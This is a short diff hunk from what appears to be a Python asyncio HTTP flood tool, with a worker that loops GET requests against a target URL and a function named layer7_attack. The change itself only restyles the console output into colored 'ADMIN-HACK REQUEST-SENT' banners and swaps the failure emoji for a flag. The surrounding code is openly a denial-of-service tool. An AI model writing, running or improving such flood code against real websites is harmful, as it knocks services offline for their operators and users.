@@ -76,9 +76,10 @@ async def worker(session, url, stop_time):
             async with session.get(url) as resp:
                 await resp.text()
                 hits += 1
-                print(Fore.CYAN + f"[L7] Request -> {url} ✅")
+                print(Fore.RED + f"[L7] {Fore.BLUE}  \033[103mADMIN-HACK\033[0m {Fore.YELLOW}REQUEST-SENT {Fore.RED} {url} {Fore.YELLOW}Running ::")
+                print(Fore.WHITE + f"[L7] {Fore.YELLOW}  ADMIN-HACK {Fore.BLUE}REQUEST-SENT \033[104m{Fore.YELLOW}{url}\033[0m {Fore.GREEN}Running :")
         except:
-            print(Fore.RED + f"[L7] Request failed -> {url} ❌")
+            print(Fore.RED + f"[L7] Request failed -> {url} 🇵🇸")
     return hits
 
 async def layer7_attack(url, concurrency, duration):
